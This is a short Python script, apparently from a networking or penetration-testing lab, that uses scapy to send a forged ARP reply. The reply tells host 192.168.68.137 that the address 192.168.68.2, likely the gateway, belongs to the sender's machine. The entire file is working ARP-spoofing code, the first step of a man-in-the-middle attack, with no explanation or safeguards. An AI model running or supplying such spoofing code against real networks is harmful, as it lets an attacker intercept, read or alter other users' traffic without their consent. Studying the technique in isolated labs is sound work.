#! /usr/bin/env python3

import scapy.all as scapy


packet = scapy.ARP(op=2, pdst="192.168.68.137", hwdst="00:0c:29:7a:d0:63", psrc="192.168.68.2")
scapy.send(packet)
